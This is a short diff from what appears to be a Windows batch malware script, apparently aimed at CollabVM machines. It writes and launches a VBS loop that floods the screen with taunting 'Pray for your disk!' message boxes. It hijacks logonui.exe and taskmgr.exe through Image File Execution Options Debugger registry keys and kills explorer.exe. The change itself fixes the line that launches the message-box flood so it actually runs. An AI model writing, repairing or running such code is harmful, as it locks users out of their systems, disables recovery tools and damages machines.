@@ -13,7 +13,7 @@ if %errorlevel%==1 goto collabvm
 echo For i = 0 to 999999 > "%userprofile%\Music\Devil.vbs"
 echo x=msgbox("Have you ever danced with the devil under the weak light of the moon?" ^& vbNewLine ^& vbNewLine ^& "Pray for your disk!" ^& vbNewLine ^& vbNewLine ^& "     - The_Joker", 2+64, "Devil") >> "%userprofile%\Music\Devil.vbs"
 echo Next >> "%userprofile%\Music\Devil.vbs"
-"%systemroot%\System32\wscript.exe %userprofile%\Music\Devil.vbs"
+start "" "%systemroot%\System32\wscript.exe" %userprofile%\Music\Devil.vbs
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\logonui.exe" /v Debugger /d \
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /d \
 taskkill /f /im explorer.exe
